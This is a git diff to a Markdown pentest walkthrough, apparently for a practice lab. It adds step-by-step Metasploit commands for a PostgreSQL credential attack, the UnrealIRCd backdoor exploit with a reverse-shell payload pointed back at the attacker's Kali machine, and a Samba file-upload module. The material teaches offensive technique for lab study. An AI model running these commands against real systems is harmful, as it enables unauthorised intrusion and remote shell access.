@@ -34,7 +34,11 @@ Example: `grep exploit search postgres`
 
 `set rhosts xxx.xxx.xxx.xxx`
 
+3. Next use the `show options` command to show the options required to execute the exploit
+
 `show options`
+
+4. Set the required options
 
 `set user_as_pass true`
 
@@ -42,7 +46,7 @@ Example: `grep exploit search postgres`
 
 `run` or `exploit`
 
-3. The exploit was successful so you can now login to the system as the username and password with the same credentials by using the folloing sytax
+5. The exploit was successful so you can now login to the system as the username and password with the same credentials by using the folloing sytax
 
 `psql -h xxx.xxx.xxx.xxx -U postgres -W`
 
@@ -56,6 +60,12 @@ Example: `grep exploit search unreal`
 
 `use exploit/unix/irc/unreal_ircd_3281_backdoor`
 
+3. Next use the `show options` command to show the options required to execute the exploit
+
+`show options`
+
+4. Set the required options
+
 `set rhost xxx.xxx.xxx.xxx` (IP of the host you are attacking)
 
 `set rport 6697` (Port number IRC app is listening on)
@@ -66,9 +76,21 @@ Example: `grep exploit search unreal`
 
 `set payload cmd/unix/reverse`
 
+`run` or `exploit`
+
 ## Samba FTP
 
+1. Start by searching for exploit based on port number and NMAP scan results of the NMAP -sV -O scan of your taget with the greatest number of open ports.
+
+2. Now lets use the auxiliary smb exploit
+
 `use auxiliary/admin/smb/upload_file`
+
+3. Next use the `show options` command to show the options required to execute the exploit
+
+`show options`
+
+4. Set the required options
 
 `set rhosts xxx.xxx.xxx.xxx`
 
@@ -87,6 +109,8 @@ Example: `grep exploit search unreal`
 `set lhost xxx.xxx.xxx.xxx` (this should be your kali linux IP address)
 
 `set lport 4444` (Port on your system exploit and payload runs to create session)
+
+`run` or `exploit`
 
 ## Apache 2.2.8
 
